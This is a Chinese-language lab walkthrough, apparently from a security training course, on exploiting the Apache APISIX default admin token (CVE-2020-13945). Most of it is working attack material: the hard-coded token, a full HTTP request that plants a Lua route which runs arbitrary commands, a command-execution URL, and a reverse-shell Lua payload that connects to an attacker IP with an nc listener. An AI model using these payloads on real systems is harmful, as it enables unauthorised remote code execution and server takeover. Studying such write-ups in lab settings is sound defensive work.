# Apache APISIX 默认密钥漏洞（CVE-2020-13945）

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞编号** | CVE-2020-13945 |
| **影响版本** | Apache APISIX **未配置管理员 Token** |
| **漏洞类型** | 认证绕过 → 远程代码执行（RCE） |
| **危险等级** | 🔴 高危 |
| **默认端口** | `9080`（HTTP）、`9443`（HTTPS） |

Apache APISIX 是一个高性能 API 网关。在用户未指定管理员 Token 或使用了默认配置文件的情况下，Apache APISIX 将使用**默认的管理员Token**，攻击者利用这个 Token 可以访问到管理员接口，进而通过 **script** 参数插入任意 **Lua** 脚本并执行。

## 漏洞概述

Apache APISIX 默认的管理员 Token 为：

```
edd1c9f034335f136f87ad84b625c8f1
```

## 漏洞复现

环境启动后，访问 `http://your-ip:9080` 即可查看到默认的 `404` 页面。

![漏洞复现截图](https://static.nextcyber.cn/attachments/images/course/task/1dcc8f79c0b54e2b909a2d36065185f2.png)

## 漏洞利用

使用 **BP** 抓包 `http://your-ip:9080` 页面，发送到**重放**模块，利用默认 **Token** 增加一个恶意的 **router**，其中包含恶意 **Lua** 脚本：

```http
POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
  "uri": "/attack",
  "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close() \n end \nreturn _M",
  "upstream": {
    "type": "roundrobin",
    "nodes": {
      "example.com:80": 1
    }
  }
}
```

![漏洞利用截图](https://static.nextcyber.cn/attachments/images/course/task/f9b02af9a61c4ba7bc1b733bd851ec71.png)

然后，访问刚才添加的 **router**，通过 **cmd** 参数执行任意命令：

```
http://your-ip:9080/attack?cmd=id
```

![命令执行截图](https://static.nextcyber.cn/attachments/images/course/task/47f2d9b7969d49a38b5af2a92ab9f7b7.png)

## 反弹Shell

使用以下 **payload**，其中 ip 为 **Kali** 的 IP，监听端口为 `1234`

```json
{
  "uri": "/shell",
  "script": "local _M={} \n function _M.access(conf, ctx) \n local s=require('socket') \n local t=assert(s.tcp()) \n t:connect('192.168.2.6','1234') \n while true do \n local r,x=t:receive();local f=assert(io.popen(r,'r')) \n local b=assert(f:read('*a'));t:send(b) \n end \n f:close();t:close() \n end \n return _M",
  "upstream": {
    "type": "roundrobin",
    "nodes": {
      "example.com:80": 1
    }
  }
}
```

修改 **payload**，然后发送

本地监听端口 `1234`

```bash
┌──(root㉿nextcyber)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
```

![反弹shell payload截图](https://static.nextcyber.cn/attachments/images/course/task/fc6c26e365154319a18ce60a80bffc77.png)

浏览器访问 `http://192.168.2.47:9080/shell`

![反弹shell执行截图](https://static.nextcyber.cn/attachments/images/course/task/ce953141b6b3454e93797cd1b8a0a911.png)

![反弹shell成功截图](https://static.nextcyber.cn/attachments/images/course/task/df7b7922e5964235bf536ab5ce8837a9.png)

可以看到，漏洞利用成功，拿到来自靶机的**反弹shell**。
